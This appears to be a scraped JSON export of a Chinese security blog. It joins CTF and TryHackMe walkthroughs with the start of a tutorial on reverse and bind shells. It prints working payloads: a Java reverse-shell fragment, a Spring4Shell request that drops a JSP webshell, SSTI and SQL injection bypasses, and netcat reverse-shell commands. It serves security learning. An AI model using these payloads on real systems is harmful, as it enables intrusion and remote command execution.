po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); 找到下面位置，执行shell即可 密码泄露提权root 拿到shell，依旧信息搜集，发现root用户密码，su切换即可 拿到flag 总结 又给我整emo了，什么时候才能凭借自己做出一个。。。 首先常规扫描，只发现了22、80端口，那毫无疑问扫web站点，同时访问80看看页面是否有什么信息泄露，发现是一个wp站点 ，同时泄露了版本：5.4.2，但似乎没有什么利用思路。接着就是wpscan工具的利用了，利用它可以扫wp版本、可能的用户名、爆破密码、插件漏洞、使用的主题等等。 这里本是可以扫出主题信息的，但我不知道为何扫不出来，随后就是根据wp目录结构，找到登陆页面，利用wpscan暴力破解密码，之后进入后台编辑PHP文件，拿到shell，发现自己是最普通用户，本以为是利用配置漏洞来提权啥的，但还是需要回归本质，做一手信息搜集，这里walkthrough是搜集到了opt目录下存在用户密码泄露，接着su就可以切换用户，但还不是 root，之后发现其内网网段还存在一个web服务，但我们在外网，需要端口转发（在回顾一手ssh端口转发），接着本地可以访问其内网了，然后发现是jenkins组件，hydra暴力破解进入后台，执行shell，监听拿到shell，发现该主机下也有密码泄露，得到root密码。成功提权 总的来说，还是需要有思路和技术的经验积累，虽然我扫出了相关信息，但还是无从下手，之后在回顾一下之前的旅程，看接下来的靶机是否会更进一步吧。 顺便说一下刚开始为何IP访问会出现页面渲染不全的问题，但用域名访问就会正常： 当只使用IP地址访问网站而无法正常渲染的原因可能有以下几点： 1. 虚拟主机配置：许多网站使用虚拟主机技术，在同一台服务器上托管多个网站。当通过域名访问网站时，Web服务器可以根据请求的域名将请求路由到正确的虚拟主机，从而提供正确的网站内容。但是，当您只使用IP地址访问网站时，服务器无法确定您要访问哪个虚拟主机，可能会返回默认的或错误的内容。 2. 域名绑定和重定向：有些网站可能使用域名绑定或重定向来将特定的域名映射到对应的网站目录或URL。当您只使用IP地址访问网站时，缺少了域名信息，可能无法触发正确的域名绑定或重定向操作，导致渲染不全或显示错误的内容。 3. 基于域名的资源加载：网站中的一些资源（例如样式表、JavaScript文件、图像等）可能使用相对路径或基于域名的绝对路径进行引用。当只使用IP地址访问网站时，浏览器无法确定正确的域名，因此无法加载这些资源，导致网站渲染不全或缺少样式和图像等元素。 使用域名访问网站可以解决上述问题，因为域名提供了更多的信息和上下文，使得服务器能够正确地处理请求并提供正确的内容。如果只能使用IP地址访问网站，并且遇到了渲染不全的问题，建议使用域名访问，或者联系网站管理员以获取更多支持和解决方案。 参考文章 【THM】Internal-练习 wpscan使用教程","tags":["tryhackme"],"categories":["tryhackme"]},{"title":"NUSTCTF","path":"/2024/03/27/nustctf/","content":"[NUSTCTF 2022 新生赛]ezProtocol web基础+md5强碰撞 &lt;?php function readmyfile($path){ $fh = fopen($path, \"rb\"); $data = fread($fh, filesize($path)); fclose($fh); return $data; } echo \"二进制md5加密: \". md5( (readmyfile(\"F:\\\\tools\\\\fastcoll-md5\\\\1.txt\"))); echo \" \";echo \" \"; echo 'url编码: '. urlencode(readmyfile(\"F:\\\\tools\\\\fastcoll-md5\\\\1.txt\")); echo \" \";echo \" \"; echo '二进制md5加密: '.md5( (readmyfile(\"F:\\\\tools\\\\fastcoll-md5\\\\2.txt\"))); echo \" \";echo \" \"; echo 'url编码: '. urlencode(readmyfile(\"F:\\\\tools\\\\fastcoll-md5\\\\2.txt\")); p1=hacker%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%1BB%0D%CC%89g%3D%2F%C3T%22%91V%DAc%A3i%BEu%8C%2B%8Eu%B3%1DZ8Ju%A4%19%5C%B0%13%E9%E4%CE%E93MK%ECdZ%DF%A5%5Dv%C4W%D2%A9%1E%84-%1D%09%1B%92%40%23%5DK%E0%EC%F9q%E6%25%29%AF%BFiJ%28%F1%05%18%16%1D%D6%AA%21%3A%05%3E%C1X%D9%3B%F5%CCT2%5D.%81c%D6%F5%27%8B%A3%C2%8DC%A1%0F%BE%B5j%A8%D4%CAw%8Bt.%25%2Cc%D4%5EA%5E%E2%04%28&amp;p2=hacker%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%1BB%0D%CC%89g%3D%2F%C3T%22%91V%DAc%A3i%BEu%0C%2B%8Eu%B3%1DZ8Ju%A4%19%5C%B0%13%E9%E4%CE%E93MK%ECdZ%DF%25%5Ev%C4W%D2%A9%1E%84-%1D%09%1B%92%C0%23%5DK%E0%EC%F9q%E6%25%29%AF%BFiJ%28%F1%05%18%16%1D%D6%AA%21%BA%05%3E%C1X%D9%3B%F5%CCT2%5D.%81c%D6%F5%27%8B%A3%C2%8DC%A1%0F%BE5j%A8%D4%CAw%8Bt.%25%2Cc%D4%5E%C1%5E%E2%04%28 数据包如下 POST / HTTP/1.1 Host: node5.anna.nssctf.cn:28243 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 x-forwarded-for: 127.0.0.1 referer: http://localhost/ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cookie: session-name=MTcwOTM2NzI0MXxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV2QxWlhOMHxn2BL7QhgGFpfSARDtqfCjwHVcRGviwJyWSnQhXDN9sw==; dinner=big%20meal Connection: close Content-Length: 1006 username=admin&amp;p1=hacker%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%1BB%0D%CC%89g%3D%2F%C3T%22%91V%DAc%A3i%BEu%8C%2B%8Eu%B3%1DZ8Ju%A4%19%5C%B0%13%E9%E4%CE%E93MK%ECdZ%DF%A5%5Dv%C4W%D2%A9%1E%84-%1D%09%1B%92%40%23%5DK%E0%EC%F9q%E6%25%29%AF%BFiJ%28%F1%05%18%16%1D%D6%AA%21%3A%05%3E%C1X%D9%3B%F5%CCT2%5D.%81c%D6%F5%27%8B%A3%C2%8DC%A1%0F%BE%B5j%A8%D4%CAw%8Bt.%25%2Cc%D4%5EA%5E%E2%04%28&amp;p2=hacker%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%1BB%0D%CC%89g%3D%2F%C3T%22%91V%DAc%A3i%BEu%0C%2B%8Eu%B3%1DZ8Ju%A4%19%5C%B0%13%E9%E4%CE%E93MK%ECdZ%DF%25%5Ev%C4W%D2%A9%1E%84-%1D%09%1B%92%C0%23%5DK%E0%EC%F9q%E6%25%29%AF%BFiJ%28%F1%05%18%16%1D%D6%AA%21%BA%05%3E%C1X%D9%3B%F5%CCT2%5D.%81c%D6%F5%27%8B%A3%C2%8DC%A1%0F%BE5j%A8%D4%CAw%8Bt.%25%2Cc%D4%5E%C1%5E%E2%04%28 [NUSTCTF 2022 新生赛]Ezjava1 @Controller public class HelloController { public HelloController() { } @RequestMapping({\"/hello\"}) public ModelAndView handleRequest(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws Exception { ModelAndView mav = new ModelAndView(\"index\"); mav.addObject(\"message\", \"Do you know \\\"beans\\\"?\"); return mav; } @PostMapping({\"/index\"}) public void postIndex(@ModelAttribute EvalBean evalBean, Model model) { System.out.println(\"@POST Called\"); } @GetMapping({\"/index\"}) public void getIndex(@ModelAttribute EvalBean evalBean, Model model) { System.out.println(\"@GET Called\"); } @RequestMapping({\"/addUser1\"}) @ResponseBody public String addUser(User user) throws IOException { System.out.println(user.getDepartment().getName1()); if (user.getDepartment().getName1().contains(\"njust\") &amp;&amp; user.getName().contains(\"2022\")) { return \"flag{1}\"; } else { String var10002 = user.getDepartment().getName1(); File f = new File(\"../webapps/ROOT/\" + var10002 + user.getName() + \".njust.jsp\"); return f.exists() ? \"flag{2}\" : user.getName(); } } } 附件给了源码，分析一波 这里题目提示我们目标是获得flag{1}，我们重点看addUser1路由即可 他这里说接受一个User对象参数，然后判断该对象中的getDepartment().getName1()属性值是否包含或等于njust且getName()属性值是否包含或等于2022，如果符合的话，就返回flag{1} 由于这里没有指定是get还是post传参，因此我们任选一个即可。这里对于Spring MVC框架不太熟悉，传参机制不明白，询问GPT如下： 当向\"/addUser1\"路由发送上述GET请求时，请求中包含了查询参数（Query Parameters），其中包括了department.name1和name两个参数。 根据Spring MVC的工作原理，当接收到该GET请求时，Spring MVC框架会自动将查询参数的值与方法参数进行绑定。 在这段代码中，方法参数为User对象，因此框架会尝试将查询参数的值绑定到User对象的对应属性上。具体的绑定过程如下： department.name1 参数的值为 “xxxnjustxxx”。根据User对象的属性命名规则，框架会尝试将该值绑定到User对象的department属性的name1属性上。 name 参数的值为 “xxx2022xxx”。同样，框架会尝试将该值绑定到User对象的name属性上。 通过这样的参数名与属性名的对应关系，Spring MVC框架会自动将查询参数的值赋给User对象的相应属性。在这个例子中，department.name1 的值 “xxxnjustxxx” 会被赋给User对象的department属性的name1属性，name 的值 “xxx2022xxx” 会被赋给User对象的name属性。 因此，当向\"/addUser1\"路由发送上述GET请求时，通过查询参数的值，可以为User类中的属性赋值。 Spring MVC框架的数据绑定机制不会受到属性的访问修饰符（如private、protected等）的影响。即使属性是private的，Spring MVC仍然可以通过反射机制来访问和设置私有属性的值。 Spring MVC使用Java反射机制来获取和设置对象的属性值，而不依赖于属性的访问修饰符。通过反射，框架可以绕过访问修饰符的限制，直接访问和修改对象的私有属性。这使得Spring MVC能够在绑定请求参数时，无论属性是private还是public，都能成功地将参数值赋给对象的属性。 因此，即使User类中的属性是private，Spring MVC仍然可以成功地将查询参数的值绑定到对应的私有属性上，实现属性赋值的功能。这种机制使得开发人员可以更灵活地设计类的属性，并不需要将属性设置为public来实现数据绑定。同时，通过封装属性的访问，可以更好地控制属性的可访问性和安全性。 因此我们最终payload为：/addUser1?department.name1=njust&amp;name=2022即可得到flag [NUSTCTF 2022 新生赛]Translate 看页面源码发现test.php &lt;?php include_once(\"fun.php\"); //我的室友板鸭把flag藏到flag.php里了 highlight_file(__FILE__); error_reporting(0); $file = $_GET['file']; if (!is_file($file)) { highlight_file(filter($file)); } else { echo \"我室友说了，会有大坏蛋来敲门!\"; } 这里尝试伪协议，但发现过滤了很多，直接上字典去fuzz，如下图也是成功fuzz到，payload如下 ?file=php://filter/UCS-4%2a/resource=flag.php 这里看flag.php，发现是进行password查询的验证，这很容易想到之前的quine注入（刚做过。。） 那直接开始测试吧，如下图，发现用户名只能是admin 这里在输入原payload的时候，发现过滤了char、空格、–+等关键字，虽然char可以用chr替换，但试了试发现没有回显，看了wp发现可以用16进制绕过。 1'union/**/select/**/replace(REPLACE('1\"union/**/select/**/replace(REPLACE(\".\",0x22,0x27),0x2e,\".\")#',0x22,0x27),0x2e,'1\"union/**/select/**/replace(REPLACE(\".\",0x22,0x27),0x2e,\".\")#')# [NUSTCTF 2022 新生赛]Ezjava2 这里与Ezjava1环境相同，只不过要获取的是flag{2}，这里审了代码没啥思路，源码里面也找不到关于njust.jsp相关的信息，只能看wp，发现没有注意到war包的名字，这很暗示着我们这里有一个spring漏洞 接着google关键词搜索spring4shell，找到了一系列RCE文章以及poc脚本，具体原理分析可参考文章： Spring 远程命令执行漏洞（CVE-2022-22965）原理分析和思考 总的来说，漏洞思路就是： 通过请求传入的参数，利用SpringMVC参数绑定机制，控制了Tomcat AccessLogValve的属性，让Tomcat在webapps/ROOT目录输出定制的“访问日志”tomcatwar.jsp，该“访问日志”实际上为一个JSP webshell。 这里我也看不太懂分析原理，直接就脚本小子了：https://github.com/reznok/Spring4Shell-POC 这里是我环境问题，复现也不成功了，这里使用vulhub来复现吧 搭建成功如上图所示，这里可以选择手打，也可以poc脚本，这里我先展示手打 GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1 Host: localhost:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Connection: close suffix: %&gt;// c1: Runtime c2: &lt;% DNT: 1 之后访问对应jsp webshell，即可RCE，这里用poc脚本的时候，发现搭的靶场出问题了，复现不出来，只好重新拉一个","tags":["CTF赛事"],"categories":["CTF赛事"]},{"title":"GDOUCTF2023","path":"/2024/03/26/gdouctf-2023/","content":"[GDOUCTF 2023]EZ WEB F12访问src看到源码 import flask app = flask.Flask(__name__) @app.route('/', methods=['GET']) def index(): return flask.send_file('index.html') @app.route('/src', methods=['GET']) def source(): return flask.send_file('app.py') @app.route('/super-secret-route-nobody-will-guess', methods=['PUT']) def flag(): return open('flag').read() 这里说用PUT方法访问对应路由，直接得到flag [GDOUCTF 2023]hate eat snake 这里不知道为何我保存在本地运行不起来，懒得调试了，直接对着代码分析 容易找到score关键词，看下面代码，这里可以直接将score修改为大的数字，运行即可 如上图所示，这里看到疑似flag，不过被js混淆了，这里可以修改getscore&gt;负数，即可，或者直接复制这段函数到控制台，然后输出alert即可。 [GDOUCTF 2023]泄露的伪装 &lt;?php error_reporting(0); if(isset($_GET['cxk'])){ $cxk=$_GET['cxk']; if(file_get_contents($cxk)==\"ctrl\"){ echo $flag; }else{ echo \"娲楁礂鐫″惂\"; } }else{ echo \"nononoononoonono\"; } ?&gt; 访问www.rar得到源码网址，伪协议传入即可 [GDOUCTF 2023]受不了一点 &lt;?php error_reporting(0); header(\"Content-type:text/html;charset=utf-8\"); if(isset($_POST['gdou'])&amp;&amp;isset($_POST['ctf'])){ $b=$_POST['ctf']; $a=$_POST['gdou']; if($_POST['gdou']!=$_POST['ctf'] &amp;&amp; md5($a)===md5($b)){ if(isset($_COOKIE['cookie'])){ if ($_COOKIE['cookie']=='j0k3r'){ if(isset($_GET['aaa']) &amp;&amp; isset($_GET['bbb'])){ $aaa=$_GET['aaa']; $bbb=$_GET['bbb']; if($aaa==114514 &amp;&amp; $bbb==114514 &amp;&amp; $aaa!=$bbb){ $give = 'cancanwordflag'; $get ='hacker!'; if(isset($_GET['flag']) &amp;&amp; isset($_POST['flag'])){ die($give); } if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){ die($get); } foreach ($_POST as $key =&gt; $value) { $$key = $value; } foreach ($_GET as $key =&gt; $value) { $$key = $$value; } echo $flag; }else{ echo \"洗洗睡吧\"; } }else{ echo \"行不行啊细狗\"; } } } else { echo '菜菜'; } }else{ echo \"就这?\"; } }else{ echo \"别来沾边\"; } ?&gt; 别来沾边 cookie的传值这里就不赘述了，至于最后的foreach循环，作者应该是写错了，正常来说应该应该是下面的payload http://node1.anna.nssctf.cn:28026?aaa=114514&amp;bbb=114514abc&amp;123=flag&amp;flag=123 POST DATA: ctf[]=1&amp;gdou[]=2&amp;123=flag&amp;flag=123 [GDOUCTF 2023]反方向的钟 &lt;?php error_reporting(0); highlight_file(__FILE__); // flag.php class teacher{ public $name; public $rank; private $salary; public function __construct($name,$rank,$salary = 10000){ $this-&gt;name = $name; $this-&gt;rank = $rank; $this-&gt;salary = $salary; } } class classroom{ public $name; public $leader; public function __construct($name,$leader){ $this-&gt;name = $name; $this-&gt;leader = $leader; } public function hahaha(){ if($this-&gt;name != 'one class' or $this-&gt;leader-&gt;name != 'ing' or $this-&gt;leader-&gt;rank !='department'){ return False; } else{ return True; } } } class school{ public $department; public $headmaster; public function __construct($department,$ceo){ $this-&gt;department = $department; $this-&gt;headmaster = $ceo; } public function IPO(){ if($this-&gt;headmaster == 'ong'){ echo \"Pretty Good ! Ctfer! \"; echo new $_POST['a']($_POST['b']); } } public function __wakeup(){ if($this-&gt;department-&gt;hahaha()) { $this-&gt;IPO(); } } } if(isset($_GET['d'])){ unserialize(base64_decode($_GET['d'])); } ?&gt; pop链子如下 &lt;?php class teacher{ public $name; public $rank; private $salary; } class classroom{ public $name; public $leader; } class school{ public $department; public $headmaster; } $pop = new school(); $pop-&gt;department = new classroom(); $pop-&gt;headmaster = 'ong'; $pop-&gt;department-&gt;name = 'one class'; $pop-&gt;department-&gt;leader = new teacher(); $pop-&gt;department-&gt;leader-&gt;name = 'ing'; $pop-&gt;department-&gt;leader-&gt;rank = 'department'; echo base64_encode(serialize($pop)); ?&gt; 链子很简单，但这里我没有想到利用原生类来做（基本没遇到过）也是看了wp知道的，翻了翻笔记这样写的 SplFileObject 原生类 为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。详情请参考：https://www.php.net/manual/zh/class.splfileobject.php 该类的构造方法可以构造一个新的文件对象用于后续的读取。我们可以像类似下面这样去读取一个文件的一行： &lt;?php $context = new SplFileObject('/etc/passwd'); echo $context; 但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历： &lt;?php $context = new SplFileObject('/etc/passwd'); foreach($context as $f){ echo($f); } //D:\\labwork\\phpstudy_pro\\WWW\\1.txt 但这里我们显然没办法去遍历，因此wp这里说利用伪协议（估计是因为结果回显的时候就是只有一行的缘故吧） 最终也是成功读取到 [GDOUCTF 2023]&lt;ez_ze&gt; 这里测试一波发现过滤了{{}}、点号、中括号以及下划线等等 点号和[]的过滤用attr即可，下划线就构造一个就行了，先看原型payload {{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('cat /flag')|attr('read')()}} 先来获取下划线和空格 {% print(lipsum|string|list) %} 这里可以看到下标9和18分别是空格与下划线 接下来先获取pop，然后利用 pop 获取上面的空格与下划线 {% set pop=(dict(pop=1))|join %} {%set xhx=(lipsum|string|list)|attr(pop)(18)%} {% set kong=(lipsum|string|list)|attr(pop)(9) %} 接下来获取斜杠，下图可以看到config里面含有斜杠，脚本遍历看看下标 import requests strs = \"/\" url = \"http://node5.anna.nssctf.cn:28089/get_flag\" for i in range(1,500): data = { \"name\": \"{% set pop=(dict(pop=1))|join %}{% print(config|string|list)|attr(pop)(\"+str(i)+\") %}\" } response = requests.post(url=url, data=data) if strs in response.text: print(response.text) print(\"目标是:\", i) else: pass {% set re=(config|string|list)|attr(pop)(239) %}//斜杠 随后获取globals {% set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join %} 用同样的方式获取__getitem__ {% set geti=(xhx,xhx,dict(get=a,item=b)|join,xhx,xhx)|join %} 其他就临摹着来即可 {% set pop=dict(pop=1)|join %} {% set kong=(lipsum|string|list)|attr(pop)(9) %} {% set xhx=(lipsum|string|list)|attr(pop)(18) %} {% set re=(config|string|list)|attr(pop)(239) %} {% set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join %} {% set geti=(xhx,xhx,dict(get=a,item=b)|join,xhx,xhx)|join %} {% set o=dict(o=a,s=b)|join %} {% set po=dict(pop=a,en=b)|join %} {% set cmd=(dict(cat=a)|join,kong,re,dict(flag=a)|join)|join %} {% set read=dict(read=a)|join %} {% print(lipsum|attr(globals)|attr(geti)(o)|attr(po)(cmd)|attr(read)()) %} 成功拿到flag 参考文章 SSTI模板注入绕过（进阶篇） GDOUCTF 2023]ez_ze GDOUCTF","tags":["CTF赛事"],"categories":["CTF赛事"]},{"title":"shell学习","path":"/2024/03/24/shell-xue-xi/","content":"0x01 什么是shell 在我们了解 发送和接收shell之前，知道 shell 实际上是什么非常重要。用最简单的术语来说，我们在与命令行环境(CLI)做接口时所使用的就是shell。换句话说，Linux 中常见的 bash 或 sh 程序就是 shell，Windows 上的 cmd.exe 和 Powershell 也是shell。在针对远程系统时，有时可以强制应用程序在服务器上运行(例如 webserver)来执行任意代码，当这种情况发生时，我们希望使用这个初始访问来获得在目标上运行的 shell。 简单地说，我们可以强制远程服务器向我们发送对服务器的命令行访问(反向 shell) ，或者在服务器上打开一个端口，我们可以连接到这个端口以执行更多的命令(绑定 shell)。 我们将在整个房间中更详细地介绍这两种场景。 这个房间的格式如下： 房间的大部分内容由信息组成，代码块和屏幕截图中给出了示例。 房间的最后两项任务中有两台虚拟机——一台是 Linux，一台是 Windows。这些可以用来练习所演示的技术。 任务 13 中有示例练习题。请随意完成这些练习，或者在完成任务时按照任务进行操作。 话不多说，让我们开始吧！ 0x02 工具介绍 我们将使用多种工具来接收反向 shell 和发送绑定 shell。一般来说，我们需要恶意的 shell 代码，以及与生成的 shell 进行接口的方法。我们将在下面简要讨论其中的每一项: Netcat Netcat 是传统的网络“瑞士军刀”。它用于手动执行各种网络交互，包括在枚举时抓取banner（横幅），更重要的是，它可以用于接收反向shell以及连接到远程端口以绑定目标系统上的shell。Netcat shells在默认情况下非常不稳定(容易丢失) ，但是我们可以通过一定技术来加以改进。 Socat Socat 就像升级版的 Netcat。它可以做和Netcat相同的事情，而且能够做更多。Socat shells 通常比开箱即用的 Netcat shells更稳定。从这个意义上说，它远远优于 netcat; 然而，Socat也有两个大的缺陷: Socat语法更加困难 在默认情况下，几乎每个 Linux 发行版都会安装Netcat，但很少会默认安装Socat Netcat和Socat在 Windows 上都有.exe 版本 Metasploit – multi/handler Metasploit 框架的 auxiliary/multi/handler 模块与 socat 和 netcat 一样，可以用于接收反向 shell。由于是 Metasploit 框架的一部分，multi/handler 提供了一种获得稳定 shell 的完全成熟的方法，并提供了多种进一步改进所捕获的 shell 的选项。 multi/handler模块是可以与 meterpreter shell 进行交互的方法，并且也是处理分段payload（有效载荷）的最简单方法。 Msfvenom 与multi/handler一样，msfvenom在技术上也是 Metasploit 框架的一部分，然而，它是作为一个独立的工具发布的。msfvenom用于动态生成payload，Msfvenom可以产生除了反向shell和绑定shell以外的其他payload（有效载荷）。 除了我们已经介绍过的工具之外，还有许多用不同编程语言书写的 关于shell利用的项目和资料，比如： https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet Kali Linux 预先安装了各种webshells，默认路径是：/usr/share/webshells 还有一个项目虽然主要是发挥字典功能，但是也包含了一些非常有用的 用于获取shell的代码：https://github.com/danielmiessler/SecLists 0x03 shell类型 从更高的层次上来说，当涉及到一个可利用目标时，我们只对两种 shell 感兴趣: 反向 shell ， 绑定 shell。 Reverse shells（反向shell） 反向 shell 是指目标被迫执行一段代码 并以此连接到你的计算机，在你自己的计算机上，你可以使用前面提到的工具之一来设置一个用于接收连接的监听器。 反向 shell 是绕过防火墙规则的一个好方法，因为防火墙规则 可能会阻止你正向连接到目标上的任意端口；然而，有一个缺点是：当从互联网上的一台机器接收 shell 时，你需要先配置好你自己的网络。 Bind shells（绑定shell） 当在目标上执行的代码用于启动一个直接连接到目标机器的shell的监听器时，就称为绑定 shell。然后，这将使目标向互联网开放，这意味着你可以连接到代码打开的端口，并通过这种方式获得远程代码执行。 这样做的好处是 不需要你在自己的网络上进行任何配置，但是该行为可能会被保护目标的防火墙加以阻止。 一般情况下，反向 shell 更容易执行和调试。 反向shell的例子 请看下面的图片。 在左边，我们有一个反向 shell 侦听器——它接收连接，而右边是发送反向 shell 的模拟目标。实际上，这更可能是通过远程网站上的代码注入或类似的注入来完成的。 把左边的图像想象成你自己的电脑，把右边的图像想象成你的目标。 #在攻击机（你的kali系统）上: sudo nc -lvnp 443 #在目标机上： nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash #&lt;LOCAL-IP&gt; &lt;PORT&gt; 指的是攻击机上的ip和正在监听的端口 注意，在右边运行命令之后，左边的监听器将接收到一个连接，连接成功后，运行 whoami 命令，能看到我们能够作为目标用户去执行命令，重要的是：我们在监听我们自己的攻击机上的端口，由目标机发送连接到攻击机。 绑定shell的例子 绑定 shell 不太常见，但仍然非常有用。 请看下面的图片。同样，左边是攻击者的电脑，右边是模拟目标。为了稍微改变一下，这次我们将使用 Windows 目标。 首先，我们在右边的目标上启动一个监听器–这一次，我们告诉它执行cmd.exe，然后，当目标机上的监听器启动并运行时，我们从自己的机器发送连接到目标机上新打开的端口 #在目标机上设置监听器，当监听器被触发时 执行cmd.exe程序： nc -lvnp &lt;port&gt; -e \"cmd.exe\" #在攻击机上发出连接请求： nc MACHINE_IP &lt;port&gt; #MACHINE_IP &lt;port&gt; 指的是目标机的ip和打开的端口 正如你所看到的，这再次为我们提供了在远程计算机上执行代码的机会。 注意，这种情况不是 Windows 特有的，重要的是要明白，我们正在目标上开启监听器，然后用我们自己的机器主动去连接到它（目标）。 最后一个与本小节相关的概念是交互性。shell可以是交互式的，也可以是非交互式的。 交互式shell 如果你使用过 Powershell、 Bash、 Zsh、 sh 或任何其他标准的CLI（命令行）环境，那么你已经接触过交互式shell。 交互式shell允许你在执行程序之后与它们发生交互。 例如，使用SSH登录: 在这里，你可以看到它以交互方式请求用户输入 yes 或 no 以继续进行登录连接。这是一个交互式程序，它需要一个交互式 shell 才能运行。 非交互式shell 非交互式shell 不会给你发生交互的机会。在非交互式shell中，只能使用不需要用户交互就能正常运行的程序。不幸的是，大多数简单的反向和绑定 shell 都是非交互式的，这可能会使进一步的漏洞利用变得更加棘手。 让我们看看在非交互式 shell 中运行 SSH 时会发生什么: 由上图可以看到，whoami 命令(非交互式)执行得非常完美，但 ssh 命令(交互式)根本不会给我们任何输出。不过，有趣的是，交互式命令的输出确实可以到达某个地方。 可以说，交互式程序不能在非交互式 shell 中工作。此外，在截图中可以看到一个名为listener的命令，此命令是用于演示的攻击机器自定义的独有别名，是sudo rlwrap nc -lvnp 443 命令的速记方法。除非你在本地配置了这个别名，否则它不会在任何其他机器上工作。 0x04 Netcat Netcat建立反向shell 建立反向 shell 需要执行反向shell 代码以及设置监听器，执行 shellcode 的方法有很多，所以我们先从设置监听器开始。 使用 Linux 启动 netcat 监听器的语法如下: nc -lvnp &lt;port-number&gt; -l #用来告诉netcat这将是一个监听器listener -v #用于请求详细输出 -n #告诉netcat不要解析主机名或者使用DNS -p #指定端口 #netcat常用参数列表： -l：用于指定nc将处于侦听模式。指定该参数，则意味着nc被当作server，侦听并接受连接，而非向其它地址发起连接。 -p：本地端口 -s：指定发送数据的源IP地址，适用于多网卡机 -u：指定nc使用UDP协议，默认为TCP -v：输出交互或出错信息，新手调试时尤为有用 -w：超时秒数，后面跟数字 -z：表示zero，表示扫描时不发送任何数据 -i：secs 延时的间隔 -L：连接关闭，仍然继续监听 -n：指定数字ip，不能用hostname -o：file 记录16进制的传输 -r：随机本地及远程端口 -t：使用Telnet交互方式 上一个小节中使用的端口是443。实际上，你可以使用任何你喜欢的端口，只要这个端口还没有被服务所占用。请注意：如果选择使用低于1024的端口，则在启动监听器时需要使用 sudo。使用一个众所周知的端口号(80、443或53)通常是一个好主意，因为这更有可能绕过目标的出站防火墙规则 例子： sudo nc -lvnp 443 然后，我们可以使用任意数量的payload（有效载荷）连接到这个目标，具体情况取决于目标环境。 Netcat建立绑定shell 如果我们希望在目标上获得绑定 shell，那么我们可以假设在目标机的选定端口上已经有一个监听器正在等待我们: 我们所需要做的就是使用攻击机主动连接到它。 这句话的语法相对简单: nc &lt;target-ip&gt; &lt;chosen-port&gt; #攻击机发出连接到目标机 在这里，我们使用 netcat 指定我们选择的目标机端口（目标机上的监听器正在监听的端口），以此建立到目标机的向外连接。（在本文后面的内容中，将会讲解如何使用netcat 在目标机上设置监听器） 0x05 shell的稳定化 我们已经捕获或连接到一个 Netcat shell，接下来该做什么？（对shell进行稳定化处理） 默认情况下，这些shell非常不稳定，按下 Ctrl + C 就会杀死整个Netcat程序，而且它们是非交互的，经常会有奇怪的格式错误。这是因为 netcat“shell”实际上是在终端内运行的进程，而不是真正的终端本身。 幸运的是，在 Linux 系统上有许多稳定 netcat shell 的方法，我们会在这里提到三个。Windows反向shell的稳定化往往要困难得多，然而，我们将要在这里介绍的第二个技巧对它也特别有用。 技巧1: Python 我们将讨论的第一种技巧只适用于 Linux 机器，因为在默认情况下Linux机器几乎总是会安装 Python。 这是一个分为三个阶段的过程（shell稳定化的前提是已经获得或者连接到shell）: 首先要做的是使用命令：python -c 'import pty;pty.spawn(\"/bin/bash\")' 它将使用 Python 产生一个功能更好的 bash shell 。 